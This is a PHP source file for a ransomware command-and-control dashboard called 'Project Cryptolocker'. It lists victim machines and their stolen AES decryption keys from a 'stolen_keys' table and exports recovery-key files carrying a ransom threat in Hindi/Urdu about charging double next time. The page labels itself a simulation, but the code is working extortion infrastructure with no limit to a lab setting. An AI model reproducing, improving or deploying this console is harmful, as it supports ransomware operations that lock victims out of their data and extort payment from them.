<?php
/**
 * dashboard.php
 * Project Cryptolocker - Balanced & Modern C2 Management Console
 */

// 1. Pull in database credentials
require_once 'config.php';

// 2. Handle Key Export Action (If download query parameter is set)
if (isset($_GET['download_key']) && isset($_GET['pc'])) {
    $download_key = trim($_GET['download_key']);
    $pc_filename = preg_replace('/[^a-zA-Z0-9_\-]/', '', $_GET['pc']); // Sanitize filename
    
    // Set headers to force browser file download
    header('Content-Type: text/plain');
    header('Content-Disposition: attachment; filename="RECOVERY_KEY_' . $pc_filename . '.txt"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    
    echo "==================================================\n";
    echo "  PROJECT CRYPTOLOCKER - RECOVERY TOKEN EXTERNAL\n";
    echo "==================================================\n\n";
    echo "Target Machine: " . $_GET['pc'] . "\n";
    echo "Decryption Key: " . $download_key . "\n\n";
    echo "Instructions:\n";
    echo "Paste this token exactly into the Decryptor UI to restore data.\n";
    echo "Ab dhyan rakhna warna agli bar double paise lun ga\n";
    exit;
}

// 3. Establish Database Connection
$conn = new mysqli($servername, $username, $password, $dbname, $port);

if ($conn->connect_error) {
    die("<div style='color:#ef4444; font-family:system-ui,sans-serif; padding:20px; background:#fef2f2; border:1px solid #fee2e2; border-radius:8px;'><strong>Database Connection Error:</strong> " . htmlspecialchars($conn->connect_error) . "</div>");
}

// 4. Fetch Stolen Keys from database (sorted by latest ID to avoid missing column errors)
$sql = "SELECT id, pc_name, encryption_key FROM stolen_keys ORDER BY id DESC";
$result = $conn->query($sql);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Control Console — Cryptolocker Simulation</title>
    
    <meta http-equiv="refresh" content="10;url=dashboard.php">
    
    <style>
        :root {
            --bg-main: #0f172a;
            --bg-card: #1e293b;
            --bg-table-header: #111827;
            --border-color: #334155;
            --text-title: #f8fafc;
            --text-body: #cbd5e1;
            --text-muted: #64748b;
            
            /* UI Accent Colors */
            --primary-blue: #2563eb;
            --primary-blue-hover: #1d4ed8;
            --indicator-green: #22c55e;
            --indicator-green-dim: rgba(34, 197, 94, 0.15);
        }

        body {
            background-color: var(--bg-main);
            color: var(--text-body);
            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            margin: 0;
            padding: 40px 20px;
        }

        .container {
            max-width: 1000px;
            margin: 0 auto;
        }

        /* Header Layout Configuration */
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background-color: var(--bg-card);
            border: 1px solid var(--border-color);
            padding: 24px 32px;
            border-radius: 12px;
            margin-bottom: 24px;
        }

        .header-title h1 {
            margin: 0;
            font-size: 22px;
            font-weight: 600;
            color: var(--text-title);
            letter-spacing: -0.01em;
        }

        .header-title p {
            margin: 6px 0 0 0;
            font-size: 14px;
            color: var(--text-muted);
        }

        .refresh-status {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background-color: #0f172a;
            border: 1px solid var(--border-color);
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 13px;
            font-weight: 500;
        }

        .pulse-dot {
            width: 8px;
            height: 8px;
            background-color: var(--indicator-green);
            border-radius: 50%;
            box-shadow: 0 0 10px var(--indicator-green);
            animation: pulse-animation 2s infinite ease-in-out;
        }

        @keyframes pulse-animation {
            0% { transform: scale(0.9); opacity: 0.6; }
            50% { transform: scale(1.1); opacity: 1; }
            100% { transform: scale(0.9); opacity: 0.6; }
        }

        /* Component Summary Widgets */
        .summary-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
            gap: 20px;
            margin-bottom: 24px;
        }

        .card {
            background-color: var(--bg-card);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            padding: 24px;
        }

        .card-label {
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            color: var(--text-muted);
            font-weight: 600;
        }

        .card-value {
            font-size: 32px;
            font-weight: 700;
            color: var(--text-title);
            margin-top: 8px;
        }

        /* Centralized Content Data Grid */
        .grid-holder {
            background-color: var(--bg-card);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
        }

        table {
            width: 100%;
            border-collapse: collapse;
            text-align: left;
        }

        th {
            background-color: var(--bg-table-header);
            color: var(--text-title);
            font-size: 12px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.03em;
            padding: 16px 24px;
            border-bottom: 1px solid var(--border-color);
        }

        td {
            padding: 18px 24px;
            border-bottom: 1px solid var(--border-color);
            font-size: 14px;
            vertical-align: middle;
        }

        tr:last-child td {
            border-bottom: none;
        }

        tr:hover td {
            background-color: #24334d;
        }

        .host-badge {
            font-weight: 600;
            color: var(--text-title);
            background-color: #0f172a;
            border: 1px solid var(--border-color);
            padding: 4px 10px;
            border-radius: 6px;
        }

        .token-string {
            font-family: "SFMono-Regular", Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
            font-size: 12px;
            color: #e2e8f0;
            background-color: #0f172a;
            padding: 6px 12px;
            border-radius: 6px;
            border: 1px solid var(--border-color);
            display: inline-block;
            word-break: break-all;
        }

        /* Action Controls Layout */
        .btn-action {
            background-color: var(--primary-blue);
            color: #ffffff;
            text-decoration: none;
            padding: 8px 16px;
            border-radius: 6px;
            font-size: 13px;
            font-weight: 600;
            border: none;
            cursor: pointer;
            transition: background-color 0.15s ease, transform 0.1s ease;
            display: inline-flex;
            align-items: center;
        }

        .btn-action:hover {
            background-color: var(--primary-blue-hover);
        }

        .btn-action:active {
            transform: scale(0.98);
        }

        .empty-notification {
            padding: 56px;
            text-align: center;
            color: var(--text-muted);
            font-size: 14px;
        }
    </style>
</head>
<body>

<div class="container">
    <header>
        <div class="header-title">
            <h1>C2 Operations Console</h1>
            <p>Cryptolocker Simulation Environment Infrastructure</p>
        </div>
        <div class="refresh-status">
            <span class="pulse-dot"></span> Live Intercept Active
        </div>
    </header>

    <div class="summary-grid">
        <div class="card">
            <div class="card-label">Logged Devices</div>
            <div class="value card-value"><?php echo $result ? $result->num_rows : 0; ?></div>
        </div>
        <div class="card">
            <div class="card-label">Listener Status</div>
            <div class="value card-value" style="color: var(--indicator-green);">ONLINE</div>
        </div>
    </div>

    <div class="grid-holder">
        <table>
            <thead>
                <tr>
                    <th style="width: 30%;">Exfiltrated Node</th>
                    <th style="width: 50%;">Decryption Token (AES-128)</th>
                    <th style="width: 20%; text-align: right;">Operations</th>
                </tr>
            </thead>
            <tbody>
                <?php
                if ($result && $result->num_rows > 0) {
                    while($row = $result->fetch_assoc()) {
                        $pc = htmlspecialchars($row['pc_name']);
                        $key = htmlspecialchars($row['encryption_key']);
                        ?>
                        <tr>
                            <td>
                                <span class="host-badge"><?php echo $pc; ?></span>
                            </td>
                            <td>
                                <span class="token-string"><?php echo $key; ?></span>
                            </td>
                            <td style="text-align: right;">
                                <a href="?download_key=<?php echo urlencode($row['encryption_key']); ?>&pc=<?php echo urlencode($row['pc_name']); ?>" 
                                   class="btn-action">
                                    Export Key
                                </a>
                            </td>
                        </tr>
                        <?php
                    }
                } else {
                    echo "<tr><td colspan='3' class='empty-notification'>No data received. Awaiting connection handshake from payload script...</td></tr>";
                }
                ?>
            </tbody>
        </table>
    </div>
</div>

</body>
</html>
<?php
$conn->close();
?>